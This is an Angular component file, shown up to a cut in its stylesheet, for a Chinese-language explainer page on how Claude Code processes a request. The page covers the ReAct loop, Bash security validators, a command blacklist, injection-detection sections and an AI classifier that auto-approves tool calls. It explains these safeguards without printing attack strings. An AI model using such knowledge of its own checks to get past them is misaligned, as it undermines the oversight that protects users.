import { Component } from '@angular/core';
import { CommonModule } from '@angular/common';

@Component({
  selector: 'app-flow',
  standalone: true,
  imports: [CommonModule],
  template: `
    <!-- HERO -->
    <div class="page-hero">
      <div class="container">
        <span class="section-tag">互動流程</span>
        <h1>使用者提問，Claude 如何回應？</h1>
        <p class="hero-desc">從您按下 Enter 到看到答案，背後經歷了哪些步驟<br>以淺顯的方式解析完整流程 · 適合所有人閱讀</p>
        <div class="hero-chips">
          <span class="chip chip-purple">ReAct 核心循環</span>
          <span class="chip chip-blue">23 項安全驗證</span>
          <span class="chip chip-teal">工具並發執行</span>
          <span class="chip chip-orange">自動模式 AI 分類</span>
          <span class="chip chip-red">錯誤自動恢復</span>
        </div>
      </div>
    </div>

    <!-- ① ANALOGY: 用比喻讓人理解 -->
    <section class="section analogy-section">
      <div class="container">
        <div class="section-header">
          <span class="section-tag">簡單比喻</span>
          <h2>把 Claude 想像成一位「專業偵探助理」</h2>
          <p>不懂程式也能理解的比喻</p>
        </div>
        <div class="analogy-grid">
          <div class="analogy-card" *ngFor="let a of analogies">
            <div class="a-icon">{{ a.icon }}</div>
            <div class="a-body">
              <h4>{{ a.title }}</h4>
              <p class="a-analogy">{{ a.analogy }}</p>
              <p class="a-tech">技術上：{{ a.tech }}</p>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ② REACT LOOP: 核心思考循環 -->
    <section class="section react-section">
      <div class="container">
        <div class="section-header">
          <span class="section-tag">ReAct 核心循環</span>
          <h2>Claude 的「思考 → 行動 → 觀察」循環</h2>
          <p>ReAct = <strong>Re</strong>asoning（推理）+ <strong>Act</strong>ion（行動）· Claude 不是一次性回答，而是反覆循環直到任務完成</p>
        </div>

        <!-- ReAct SVG Diagram -->
        <div class="react-diagram-wrap">
          <svg viewBox="0 0 860 440" class="react-svg">
            <defs>
              <marker id="r-arrow" markerWidth="10" markerHeight="10" refX="8" refY="3.5" orient="auto">
                <path d="M0,0 L0,7 L10,3.5 z" fill="#7c5cfc"/>
              </marker>
              <marker id="r-arrow-teal" markerWidth="10" markerHeight="10" refX="8" refY="3.5" orient="auto">
                <path d="M0,0 L0,7 L10,3.5 z" fill="#00d4aa"/>
              </marker>
              <marker id="r-arrow-orange" markerWidth="10" markerHeight="10" refX="8" refY="3.5" orient="auto">
                <path d="M0,0 L0,7 L10,3.5 z" fill="#ff8c42"/>
              </marker>
              <marker id="r-arrow-red" markerWidth="10" markerHeight="10" refX="8" refY="3.5" orient="auto">
                <path d="M0,0 L0,7 L10,3.5 z" fill="#ff4d6d"/>
              </marker>
              <filter id="glow-purple">
                <feGaussianBlur stdDeviation="3" result="coloredBlur"/>
                <feMerge><feMergeNode in="coloredBlur"/><feMergeNode in="SourceGraphic"/></feMerge>
              </filter>
            </defs>
            <rect width="860" height="440" fill="#080c18" rx="16"/>

            <!-- Title -->
            <text x="430" y="32" text-anchor="middle" fill="#7c5cfc" font-size="13" font-weight="700" font-family="monospace">ReAct Loop — query.ts while(true)</text>

            <!-- User Input (left) -->
            <rect x="30" y="180" width="120" height="80" rx="12" fill="rgba(124,92,252,0.2)" stroke="#7c5cfc" stroke-width="2"/>
            <text x="90" y="214" text-anchor="middle" fill="#e2e8f0" font-size="12" font-weight="700">使用者</text>
            <text x="90" y="230" text-anchor="middle" fill="#e2e8f0" font-size="12" font-weight="700">提問</text>
            <text x="90" y="248" text-anchor="middle" fill="#b8c8e0" font-size="9">按下 Enter</text>

            <!-- Arrow user -> think -->
            <line x1="150" y1="220" x2="188" y2="220" stroke="#7c5cfc" stroke-width="2" marker-end="url(#r-arrow)"/>

            <!-- THINK bubble -->
            <ellipse cx="270" cy="140" rx="90" ry="65" fill="rgba(92,138,255,0.15)" stroke="#5c8aff" stroke-width="2" filter="url(#glow-purple)"/>
            <text x="270" y="122" text-anchor="middle" fill="#5c8aff" font-size="22">🧠</text>
            <text x="270" y="145" text-anchor="middle" fill="#e2e8f0" font-size="13" font-weight="800">REASON</text>
            <text x="270" y="162" text-anchor="middle" fill="#b8c8e0" font-size="9">推理 · 規劃 · 決策</text>
            <text x="270" y="176" text-anchor="middle" fill="#7c8caa" font-size="8">「我需要什麼工具？」</text>

            <!-- Think -> Act -->
            <line x1="355" y1="160" x2="440" y2="160" stroke="#5c8aff" stroke-width="2" marker-end="url(#r-arrow)"/>
            <text x="397" y="152" text-anchor="middle" fill="#5c8aff" font-size="8">tool_use</text>
            <text x="397" y="170" text-anchor="middle" fill="#5c8aff" font-size="8">決定呼叫工具</text>

            <!-- ACT bubble -->
            <ellipse cx="530" cy="140" rx="90" ry="65" fill="rgba(255,140,66,0.15)" stroke="#ff8c42" stroke-width="2"/>
            <text x="530" y="122" text-anchor="middle" fill="#ff8c42" font-size="22">⚡</text>
            <text x="530" y="145" text-anchor="middle" fill="#e2e8f0" font-size="13" font-weight="800">ACT</text>
            <text x="530" y="162" text-anchor="middle" fill="#b8c8e0" font-size="9">執行工具</text>
            <text x="530" y="176" text-anchor="middle" fill="#7c8caa" font-size="8">Bash / Read / Edit…</text>

            <!-- Act -> Observe -->
            <line x1="615" y1="160" x2="700" y2="160" stroke="#ff8c42" stroke-width="2" marker-end="url(#r-arrow-orange)"/>
            <text x="657" y="152" text-anchor="middle" fill="#ff8c42" font-size="8">tool_result</text>
            <text x="657" y="170" text-anchor="middle" fill="#ff8c42" font-size="8">取得結果</text>

            <!-- OBSERVE bubble -->
            <ellipse cx="780" cy="140" rx="70" ry="65" fill="rgba(0,212,170,0.15)" stroke="#00d4aa" stroke-width="2"/>
            <text x="780" y="122" text-anchor="middle" fill="#00d4aa" font-size="22">👁️</text>
            <text x="780" y="145" text-anchor="middle" fill="#e2e8f0" font-size="13" font-weight="800">OBSERVE</text>
            <text x="780" y="162" text-anchor="middle" fill="#b8c8e0" font-size="9">觀察結果</text>
            <text x="780" y="176" text-anchor="middle" fill="#7c8caa" font-size="8">更新上下文</text>

            <!-- Loop arrow: Observe -> Think (bottom curve) -->
            <path d="M780,205 L780,310 L270,310 L270,205" fill="none" stroke="#00d4aa" stroke-width="2" stroke-dasharray="6,4" marker-end="url(#r-arrow-teal)"/>
            <text x="525" y="330" text-anchor="middle" fill="#00d4aa" font-size="10" font-weight="700">↻ 繼續循環：加入工具結果，重新思考</text>
            <text x="525" y="346" text-anchor="middle" fill="#7c8caa" font-size="9">stop_reason = "tool_use" → 繼續 | stop_reason = "end_turn" → 結束</text>

            <!-- Think -> User (直接回答，無工具) -->
            <line x1="270" y1="205" x2="270" y2="360" stroke="#7c5cfc" stroke-width="1.5" stroke-dasharray="4,3"/>
            <line x1="270" y1="360" x2="90" y2="360" stroke="#7c5cfc" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#r-arrow)"/>
            <rect x="30" y="350" width="120" height="60" rx="10" fill="rgba(124,92,252,0.12)" stroke="rgba(124,92,252,0.4)" stroke-width="1.5"/>
            <text x="90" y="374" text-anchor="middle" fill="#e2e8f0" font-size="11" font-weight="700">✅ 完成</text>
            <text x="90" y="390" text-anchor="middle" fill="#b8c8e0" font-size="9">顯示最終回應</text>
            <text x="207" y="340" text-anchor="middle" fill="#7c5cfc" font-size="8">不需工具，直接回覆</text>

            <!-- Turn counter -->
            <rect x="360" y="380" width="160" height="44" rx="8" fill="rgba(255,209,102,0.1)" stroke="rgba(255,209,102,0.3)" stroke-width="1"/>
            <text x="440" y="398" text-anchor="middle" fill="#ffd166" font-size="10" font-weight="700">Turn 計數器</text>
            <text x="440" y="414" text-anchor="middle" fill="#b8c8e0" font-size="9">達到 maxTurns → 強制結束</text>

            <!-- Security badge -->
            <rect x="560" y="380" width="180" height="44" rx="8" fill="rgba(255,77,109,0.1)" stroke="rgba(255,77,109,0.3)" stroke-width="1"/>
            <text x="650" y="398" text-anchor="middle" fill="#ff4d6d" font-size="10" font-weight="700">🔐 安全檢查</text>
            <text x="650" y="414" text-anchor="middle" fill="#b8c8e0" font-size="9">每次 ACT 前進行 23 項驗證</text>
          </svg>
        </div>

        <!-- ReAct 3 columns -->
        <div class="react-cols">
          <div class="react-col react-col--reason">
            <div class="rc-header">
              <span class="rc-icon">🧠</span>
              <h3>REASON 推理</h3>
            </div>
            <p>Claude 閱讀您的問題與對話歷史，決定「現在應該做什麼」。可能直接回答，也可能決定需要先執行某些工具來收集資訊。</p>
            <div class="rc-items">
              <div class="rc-item" *ngFor="let r of reactReason">
                <code>{{ r.code }}</code>
                <span>{{ r.desc }}</span>
              </div>
            </div>
          </div>
          <div class="react-col react-col--act">
            <div class="rc-header">
              <span class="rc-icon">⚡</span>
              <h3>ACT 行動</h3>
            </div>
            <p>Claude 呼叫一個或多個工具來執行實際操作，例如讀取檔案、執行命令、搜尋程式碼。執行前會先通過安全檢查。</p>
            <div class="rc-items">
              <div class="rc-item" *ngFor="let a of reactAct">
                <code>{{ a.code }}</code>
                <span>{{ a.desc }}</span>
              </div>
            </div>
          </div>
          <div class="react-col react-col--observe">
            <div class="rc-header">
              <span class="rc-icon">👁️</span>
              <h3>OBSERVE 觀察</h3>
            </div>
            <p>工具執行結果作為 tool_result 加入對話歷史，Claude 看到這些結果後再次進入 REASON 階段，判斷任務是否完成。</p>
            <div class="rc-items">
              <div class="rc-item" *ngFor="let o of reactObserve">
                <code>{{ o.code }}</code>
                <span>{{ o.desc }}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ③ FULL PIPELINE: 完整流程 8 階段 -->
    <section class="section pipeline-section">
      <div class="container">
        <div class="section-header">
          <span class="section-tag">完整流程</span>
          <h2>從輸入到輸出：8 個核心階段</h2>
          <p>每個階段都有對應的原始碼位置</p>
        </div>

        <div class="pipeline">
          <div class="pipeline-item" *ngFor="let step of pipelineSteps; let i = index">
            <div class="pi-connector" *ngIf="i > 0">
              <div class="pi-line"></div>
              <div class="pi-arrow">↓</div>
            </div>
            <div class="pi-card" [class]="'pi-card--' + step.color">
              <div class="pi-left">
                <div class="pi-num" [class]="'pi-num--' + step.color">{{ step.num }}</div>
                <div class="pi-icon">{{ step.icon }}</div>
              </div>
              <div class="pi-body">
                <div class="pi-top">
                  <h3>{{ step.title }}</h3>
                  <span class="pi-layer">{{ step.layer }}</span>
                </div>
                <p class="pi-simple">{{ step.simple }}</p>
                <p class="pi-detail">{{ step.detail }}</p>
                <div class="pi-tags">
                  <code *ngFor="let f of step.files">{{ f }}</code>
                </div>
                <div class="pi-facts" *ngIf="step.facts">
                  <div class="pi-fact" *ngFor="let f of step.facts">
                    <span class="pf-icon">{{ f.icon }}</span>
                    <span>{{ f.text }}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ④ SECURITY: 安全機制詳解 -->
    <section class="section security-section">
      <div class="container">
        <div class="section-header">
          <span class="section-tag">安全機制</span>
          <h2>23 項安全驗證 · 多層防護</h2>
          <p>每次執行 Bash 指令前，系統都會進行嚴格的安全檢查，防止指令注入與危險操作</p>
        </div>

        <!-- Security overview SVG -->
        <div class="security-flow-wrap">
          <svg viewBox="0 0 860 200" class="security-svg">
            <rect width="860" height="200" fill="#080c18" rx="12"/>
            <!-- Steps -->
            <rect x="20" y="60" width="130" height="80" rx="10" fill="rgba(92,138,255,0.15)" stroke="rgba(92,138,255,0.4)" stroke-width="1.5"/>
            <text x="85" y="90" text-anchor="middle" fill="#5c8aff" font-size="20">📝</text>
            <text x="85" y="110" text-anchor="middle" fill="#e2e8f0" font-size="11" font-weight="700">指令輸入</text>
            <text x="85" y="126" text-anchor="middle" fill="#7c8caa" font-size="9">Claude 要執行的</text>
            <text x="85" y="138" text-anchor="middle" fill="#7c8caa" font-size="9">Shell 指令</text>

            <line x1="150" y1="100" x2="178" y2="100" stroke="#5c8aff" stroke-width="2" marker-end="url(#r-arrow)"/>

            <rect x="180" y="60" width="150" height="80" rx="10" fill="rgba(255,77,109,0.15)" stroke="rgba(255,77,109,0.4)" stroke-width="1.5"/>
            <text x="255" y="90" text-anchor="middle" fill="#ff4d6d" font-size="20">🔍</text>
            <text x="255" y="110" text-anchor="middle" fill="#e2e8f0" font-size="11" font-weight="700">語法解析</text>
            <text x="255" y="126" text-anchor="middle" fill="#7c8caa" font-size="9">拆解指令結構</text>
            <text x="255" y="138" text-anchor="middle" fill="#7c8caa" font-size="9">偵測混淆手法</text>

            <line x1="330" y1="100" x2="358" y2="100" stroke="#ff4d6d" stroke-width="2" marker-end="url(#r-arrow-red)"/>

            <rect x="360" y="60" width="150" height="80" rx="10" fill="rgba(255,77,109,0.15)" stroke="rgba(255,77,109,0.5)" stroke-width="1.5"/>
            <text x="435" y="90" text-anchor="middle" fill="#ff4d6d" font-size="20">🛡️</text>
            <text x="435" y="110" text-anchor="middle" fill="#e2e8f0" font-size="11" font-weight="700">23 項驗證</text>
            <text x="435" y="126" text-anchor="middle" fill="#7c8caa" font-size="9">黑名單 / 注入 / 混淆</text>
            <text x="435" y="138" text-anchor="middle" fill="#7c8caa" font-size="9">危險模式檢測</text>

            <!-- Pass / Fail branches -->
            <line x1="510" y1="85" x2="560" y2="55" stroke="#00d4aa" stroke-width="1.5" marker-end="url(#r-arrow-teal)"/>
            <line x1="510" y1="115" x2="560" y2="145" stroke="#ff4d6d" stroke-width="1.5" marker-end="url(#r-arrow-red)"/>

            <text x="535" y="48" fill="#00d4aa" font-size="9" font-weight="700">通過 ✓</text>
            <text x="535" y="155" fill="#ff4d6d" font-size="9" font-weight="700">拒絕 ✗</text>

            <rect x="560" y="30" width="140" height="50" rx="8" fill="rgba(0,212,170,0.12)" stroke="rgba(0,212,170,0.4)" stroke-width="1.5"/>
            <text x="630" y="52" text-anchor="middle" fill="#00d4aa" font-size="11" font-weight="700">權限確認</text>
            <text x="630" y="68" text-anchor="middle" fill="#b8c8e0" font-size="9">自動/詢問使用者</text>

            <rect x="560" y="120" width="140" height="50" rx="8" fill="rgba(255,77,109,0.12)" stroke="rgba(255,77,109,0.4)" stroke-width="1.5"/>
            <text x="630" y="142" text-anchor="middle" fill="#ff4d6d" font-size="11" font-weight="700">拒絕執行</text>
            <text x="630" y="158" text-anchor="middle" fill="#b8c8e0" font-size="9">回報安全風險</text>

            <line x1="700" y1="55" x2="738" y2="55" stroke="#00d4aa" stroke-width="1.5" marker-end="url(#r-arrow-teal)"/>
            <rect x="740" y="30" width="100" height="50" rx="8" fill="rgba(0,212,170,0.15)" stroke="rgba(0,212,170,0.5)" stroke-width="1.5"/>
            <text x="790" y="55" text-anchor="middle" fill="#00d4aa" font-size="20">✅</text>
            <text x="790" y="72" text-anchor="middle" fill="#b8c8e0" font-size="9">執行指令</text>
          </svg>
        </div>

        <!-- Security validators grid -->
        <div class="security-validators">
          <h3 class="sv-title">23 項安全驗證器（bashSecurity.ts）</h3>
          <div class="sv-grid">
            <div class="sv-card" *ngFor="let v of securityValidators">
              <div class="sv-id">#{{ v.id }}</div>
              <div class="sv-body">
                <div class="sv-name">{{ v.name }}</div>
                <div class="sv-desc">{{ v.desc }}</div>
              </div>
              <div class="sv-level" [class]="'sv-level--' + v.level">{{ v.levelLabel }}</div>
            </div>
          </div>
        </div>

        <!-- Blacklist -->
        <div class="blacklist-section">
          <h3 class="bl-title">🚫 Zsh 直接黑名單（zshDangerousCommands）</h3>
          <p class="bl-desc">以下指令無論如何都不允許執行，因為它們可以繞過所有前綴規則，直接存取系統或進行網路操作：</p>
          <div class="bl-grid">
            <div class="bl-item" *ngFor="let b of blacklistItems">
              <code class="bl-cmd">{{ b.cmd }}</code>
              <span class="bl-reason">{{ b.reason }}</span>
            </div>
          </div>
        </div>

        <!-- Injection patterns -->
        <div class="injection-section">
          <h3 class="inj-title">💉 指令注入偵測模式</h3>
          <div class="inj-grid">
            <div class="inj-card" *ngFor="let inj of injectionPatterns">
              <div class="inj-header">
                <span class="inj-icon">{{ inj.icon }}</span>
                <h4>{{ inj.title }}</h4>
              </div>
              <p>{{ inj.desc }}</p>
              <div class="inj-examples">
                <code *ngFor="let ex of inj.examples">{{ ex }}</code>
              </div>
              <div class="inj-why">為何危險：{{ inj.why }}</div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ⑤ AUTO MODE: 自動模式與權限系統 -->
    <section class="section automode-section">
      <div class="container">
        <div class="section-header">
          <span class="section-tag">自動模式</span>
          <h2>權限系統 · AI 分類器 · 自動決策</h2>
          <p>Claude Code 如何決定「這個操作需要問使用者嗎？」</p>
        </div>

        <!-- Permission modes -->
        <div class="perm-modes">
          <h3 class="pm-title">四種權限模式</h3>
          <div class="pm-grid">
            <div class="pm-card" *ngFor="let m of permModes">
              <div class="pm-header" [class]="'pm-header--' + m.color">
                <span class="pm-icon">{{ m.icon }}</span>
                <div>
                  <h4>{{ m.name }}</h4>
                  <code>{{ m.code }}</code>
                </div>
              </div>
              <p>{{ m.desc }}</p>
              <div class="pm-allowed">
                <div class="pm-allow-item" *ngFor="let a of m.allowed">
                  <span class="pa-dot" [class]="'pa-dot--' + a.type"></span>
                  <span>{{ a.text }}</span>
                </div>
              </div>
              <div class="pm-warning" *ngIf="m.warning">⚠️ {{ m.warning }}</div>
            </div>
          </div>
        </div>

        <!-- Auto mode classifier flow -->
        <div class="classifier-section">
          <h3 class="cls-title">🤖 自動模式：AI 分類器決策流程</h3>
          <p class="cls-desc">在 auto 模式下，系統使用 ML 分類器在 2 秒內自動判斷是否允許工具執行，無需每次詢問使用者</p>
          <div class="cls-flow">
            <div class="cls-step" *ngFor="let s of classifierSteps; let last = last">
              <div class="cs-card" [class]="'cs-card--' + s.color">
                <div class="cs-num">{{ s.num }}</div>
                <div class="cs-icon">{{ s.icon }}</div>
                <h4>{{ s.title }}</h4>
                <p>{{ s.desc }}</p>
                <code *ngIf="s.code">{{ s.code }}</code>
              </div>
              <div class="cs-arrow" *ngIf="!last">→</div>
            </div>
          </div>
        </div>

        <!-- Safe env vars -->
        <div class="envvar-section">
          <h3 class="env-title">✅ 安全環境變數白名單（SAFE_ENV_VARS）</h3>
          <p class="env-desc">這些環境變數被明確允許傳入工具，因為它們不會影響指令路由或網路目標：</p>
          <div class="env-grid">
            <div class="env-group" *ngFor="let g of safeEnvGroups">
              <div class="eg-label">{{ g.label }}</div>
              <div class="eg-vars">
                <code *ngFor="let v of g.vars">{{ v }}</code>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ⑥ TOOL CONCURRENCY: 工具並發 -->
    <section class="section concurrency-section">
      <div class="container">
        <div class="section-header">
          <span class="section-tag">工具執行策略</span>
          <h2>讀取並發 · 寫入串行</h2>
          <p>Claude Code 根據工具的安全性，智慧選擇並發或串行執行</p>
        </div>
        <div class="conc-layout">
          <div class="conc-card conc-card--concurrent">
            <div class="cc-header">
              <span class="cc-badge cc-badge--green">並發執行</span>
              <span class="cc-count">最多 10 個同時</span>
            </div>
            <div class="cc-icon-row">⚡⚡⚡</div>
            <p>只讀工具不會修改任何檔案，可以安全地同時執行多個，大幅節省時間。</p>
            <div class="cc-tools">
              <div class="cc-tool" *ngFor="let t of concurrentTools">
                <code>{{ t.name }}</code>
                <span>{{ t.desc }}</span>
              </div>
            </div>
          </div>
          <div class="conc-vs">VS</div>
          <div class="conc-card conc-card--serial">
            <div class="cc-header">
              <span class="cc-badge cc-badge--orange">串行執行</span>
              <span class="cc-count">一次一個，依序執行</span>
            </div>
            <div class="cc-icon-row">🔒🔒🔒</div>
            <p>寫入工具會修改系統狀態，必須串行執行以避免衝突和資料損壞。</p>
            <div class="cc-tools">
              <div class="cc-tool" *ngFor="let t of serialTools">
                <code>{{ t.name }}</code>
                <span>{{ t.desc }}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ⑦ ERROR RECOVERY: 錯誤恢復 -->
    <section class="section recovery-section">
      <div class="container">
        <div class="section-header">
          <span class="section-tag">錯誤自動恢復</span>
          <h2>遇到問題時，自動嘗試修復</h2>
          <p>Claude Code 有完整的錯誤恢復策略，大多數問題不需要使用者介入</p>
        </div>
        <div class="recovery-cards">
          <div class="rec-card" *ngFor="let r of recoveryItems">
            <div class="rec-header">
              <span class="rec-icon">{{ r.icon }}</span>
              <div>
                <h4>{{ r.title }}</h4>
                <span class="rec-trigger">觸發條件：{{ r.trigger }}</span>
              </div>
            </div>
            <div class="rec-steps">
              <div class="rs-step" *ngFor="let s of r.steps; let i = index">
                <div class="rs-num">{{ i + 1 }}</div>
                <div class="rs-body">
                  <strong>{{ s.name }}</strong>
                  <span>{{ s.desc }}</span>
                </div>
              </div>
            </div>
            <div class="rec-fallback">最終回退：{{ r.fallback }}</div>
          </div>
        </div>
      </div>
    </section>

    <!-- ⑧ DECISION TREE: 關鍵決策 -->
    <section class="section decisions-section">
      <div class="container">
        <div class="section-header">
          <span class="section-tag">關鍵決策點</span>
          <h2>流程中的重要判斷分支</h2>
          <p>Claude Code 在處理每個請求時，需要做出多個重要決策</p>
        </div>
        <div class="decisions-grid">
          <div class="dec-card" *ngFor="let d of decisions">
            <div class="dec-q">
              <span class="dec-qicon">{{ d.icon }}</span>
              <h4>{{ d.question }}</h4>
            </div>
            <div class="dec-branches">
              <div class="dec-branch dec-branch--yes">
                <span class="db-label">是 ✓</span>
                <span>{{ d.yes }}</span>
              </div>
              <div class="dec-branch dec-branch--no">
                <span class="db-label">否 ✗</span>
                <span>{{ d.no }}</span>
              </div>
            </div>
            <code class="dec-ref">{{ d.ref }}</code>
          </div>
        </div>
      </div>
    </section>

    <!-- ⑨ PERF: 效能優化 -->
    <section class="section perf-section">
      <div class="container">
        <div class="section-header">
          <span class="section-tag">效能設計</span>
          <h2>讓 Claude 更快、更省錢的設計</h2>
        </div>
        <div class="perf-grid">
          <div class="perf-card" *ngFor="let p of perfItems">
            <div class="pc-icon" [style.color]="p.color">{{ p.icon }}</div>
            <h4>{{ p.title }}</h4>
            <p>{{ p.desc }}</p>
            <div class="pc-saving">{{ p.saving }}</div>
          </div>
        </div>
      </div>
    </section>
  `,
  styles: [`
    :host { display: block; }

    /* ─── HERO ─── */
    .page-hero {
      padding: 140px 0 70px;
      text-align: center;
      background: radial-gradient(ellipse at 50% 0%, rgba(124,92,252,0.18) 0%, transparent 70%);
      h1 {
        font-size: clamp(1.8rem, 3.5vw, 2.8rem);
        font-weight: 800;
        margin: 16px 0 12px;
        background: linear-gradient(135deg, #fff 0%, #b8c8e0 100%);
        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      }
      .hero-desc { color: var(--text-secondary); font-size: 1.05rem; line-height: 1.7; }
    }
    .hero-chips {
      display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-top: 24px;
    }
    .chip {
      padding: 6px 16px; border-radius: 20px; font-size: 0.82rem; font-weight: 600; border: 1px solid;
    }
    .chip-purple { background: rgba(124,92,252,0.15); border-color: rgba(124,92,252,0.35); color: #a78fff; }
    .chip-blue   { background: rgba(92,138,255,0.15); border-color: rgba(92,138,255,0.35); color: #7ab0ff; }
    .chip-teal   { background: rgba(0,212,170,0.12); border-color: rgba(0,212,170,0.3); color: #00d4aa; }
    .chip-orange { background: rgba(255,140,66,0.12); border-color: rgba(255,140,66,0.3); color: #ff8c42; }
    .chip-red    { background: rgba(255,77,109,0.12); border-color: rgba(255,77,109,0.3); color: #ff4d6d; }

    /* ─── SECTION BASE ─── */
    .section { padding: 80px 0; }
    .section:nth-child(even) { background: rgba(255,255,255,0.018); }
    .section-header {
      text-align: center; margin-bottom: 52px;
      h2 { font-size: clamp(1.4rem, 2.5vw, 1.9rem); font-weight: 700; margin: 12px 0 8px; }
      p { color: var(--text-secondary); }
      strong { color: var(--text-primary); }
    }
    .section-tag {
      display: inline-block; padding: 4px 14px; border-radius: 20px;
      background: rgba(124,92,252,0.15); border: 1px solid rgba(124,92,252,0.3);
      color: #7c5cfc; font-size: 0.8rem; font-weight: 600; letter-spacing: 0.05em;
    }

    /* ─── ANALOGY ─── */
    .analogy-grid {
      display: grid; grid-template-columns: repeat(auto-fill, minmax(280px,1fr)); gap: 20px;
    }
    .analogy-card {
      background: var(--bg-secondary); border: 1px solid var(--border-color);
      border-radius: 14px; padding: 24px; display: flex; gap: 18px; align-items: flex-start;
      transition: transform .2s;
      &:hover { transform: translateY(-3px); }
      .a-icon { font-size: 2.2rem; min-width: 44px; }
      h4 { font-size: 1rem; font-weight: 700; margin-bottom: 8px; }
      .a-analogy { color: var(--text-primary); font-size: 0.875rem; margin-bottom: 8px; line-height: 1.5; }
      .a-tech { color: var(--text-secondary); font-size: 0.8rem; line-height: 1.4;
        border-top: 1px solid rgba(255,255,255,0.08); padding-top: 8px; margin-top: 4px; }
    }

    /* ─── REACT ─── */
    .react-diagram-wrap {
      background: #080c18; border: 1px solid var(--border-color); border-radius: 16px;
      padding: 8px; margin-bottom: 40px; overflow: hidden;
    }
    .react-svg { width: 100%; height: auto; display: block; }
    .react-cols {
      display: grid; grid-template-columns: repeat(3,1fr); gap: 20px;
    }
    .react-col {
      background: var(--bg-secondary); border: 1px solid var(--border-color);
      border-radius: 14px; padding: 24px;
    }
    .react-col--reason { border-top: 3px solid #5c8aff; }
    .react-col--act    { border-top: 3px solid #ff8c42; }
    .react-col--observe{ border-top: 3px solid #00d4aa; }
    .rc-header {
      display: flex; align-items: center; gap: 12px; margin-bottom: 14px;
      .rc-icon { font-size: 1.8rem; }
      h3 { font-size: 1rem; font-weight: 800; margin: 0; }
    }
    .react-col p { color: var(--text-secondary); font-size: 0.875rem; line-height: 1.6; margin-bottom: 16px; }
    .rc-items { display: flex; flex-direction: column; gap: 8px; }
    .rc-item {
      display: flex; gap: 10px; align-items: baseline; font-size: 0.82rem;
      code { font-size: 0.75rem; background: rgba(255,255,255,0.06); padding: 2px 6px; border-radius: 4px; color: #00d4aa; min-width: fit-content; }
      span { color: var(--text-secondary); }
    }

    /* ─── PIPELINE ─── */
    .pipeline { display: flex; flex-direction: column; max-width: 900px; margin: 0 auto; gap: 0; }
    .pi-connector {
      display: flex; flex-direction: column; align-items: center; padding: 4px 0;
      .pi-line { width: 2px; height: 16px; background: var(--border-color); }
      .pi-arrow { color: var(--text-secondary); font-size: 1.1rem; line-height: 1; }
    }
    .pi-card {
      background: var(--bg-secondary); border: 1px solid var(--border-color);
      border-radius: 14px; padding: 22px 24px; display: flex; gap: 20px;
      border-left: 4px solid transparent; transition: transform .2s, box-shadow .2s;
      &:hover { transform: translateX(4px); box-shadow: 0 4px 24px rgba(0,0,0,0.3); }
    }
    .pi-card--purple { border-left-color: #7c5cfc; }
    .pi-card--blue   { border-left-color: #5c8aff; }
    .pi-card--yellow { border-left-color: #ffd166; }
    .pi-card--teal   { border-left-color: #00d4aa; }
    .pi-card--orange { border-left-color: #ff8c42; }
    .pi-card--red    { border-left-color: #ff4d6d; }
    .pi-left {
      display: flex; flex-direction: column; align-items: center; gap: 8px; min-width: 52px;
    }
    .pi-num {
      width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center;
      justify-content: center; font-weight: 800; font-size: 0.9rem;
    }
    .pi-num--purple { background: rgba(124,92,252,0.2); color: #a78fff; }
    .pi-num--blue   { background: rgba(92,138,255,0.2); color: #7ab0ff; }
    .pi-num--yellow { background: rgba(255,209,102,0.2); color: #ffd166; }
    .pi-num--teal   { background: rgba(0,212,170,0.2); color: #00d4aa; }
    .pi-num--orange { background: rgba(255,140,66,0.2); color: #ff8c42; }
    .pi-num--red    { background: rgba(255,77,109,0.2); color: #ff4d6d; }
    .pi-icon { font-size: 1.5rem; }
    .pi-top { display: flex; align-items: baseline; gap: 12px; margin-bottom: 6px;
      h3 { font-size: 1.05rem; font-weight: 700; margin: 0; }
    }
    .pi-layer { font-size: 0.72rem; color: var(--text-secondary); background: rgba(255,255,255,0.06); padding: 2px 8px; border-radius: 10px; }
    .pi-simple { color: var(--text-primary); font-size: 0.9rem; font-weight: 500; margin-bottom: 6px; }
    .pi-detail { color: var(--text-secondary); font-size: 0.82rem; line-height: 1.6; margin-bottom: 10px; }
    .pi-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 10px;
      code { font-size: 0.72rem; background: rgba(0,212,170,0.08); border: 1px solid rgba(0,212,170,0.2); color: #00d4aa; padding: 2px 8px; border-radius: 4px; }
    }
    .pi-facts { display: flex; flex-wrap: wrap; gap: 8px; }
    .pi-fact {
      display: flex; align-items: center; gap: 6px; font-size: 0.78rem;
      background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08);
      padding: 4px 10px; border-radius: 6px; color: var(--text-secondary);
      .pf-icon { font-size: 0.9rem; }
    }

    /* ─── SECURITY ─── */
    .security-flow-wrap {
      background: #080c18; border: 1px solid var(--border-color); border-radius: 12px;
      padding: 8px; margin-bottom: 40px;
    }
    .security-svg { width: 100%; height: auto; display: block; }

    .sv-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 20px; }
    .sv-grid {
      display: grid; grid-template-columns: repeat(auto-fill, minmax(240px,1fr)); gap: 10px; margin-bottom: 48px;
    }
    .sv-card {
      background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 8px;
      padding: 12px; display: flex; align-items: flex-start; gap: 10px;
    }
    .sv-id { font-size: 0.7rem; color: var(--text-secondary); font-family: monospace; min-width: 24px; margin-top: 2px; }
    .sv-name { font-size: 0.82rem; font-weight: 700; color: var(--text-primary); margin-bottom: 2px; }
    .sv-desc { font-size: 0.75rem; color: var(--text-secondary); line-height: 1.4; }
    .sv-body { flex: 1; }
    .sv-level { font-size: 0.68rem; font-weight: 700; padding: 2px 8px; border-radius: 10px; white-space: nowrap; margin-top: 2px; }
    .sv-level--high   { background: rgba(255,77,109,0.15); color: #ff4d6d; border: 1px solid rgba(255,77,109,0.3); }
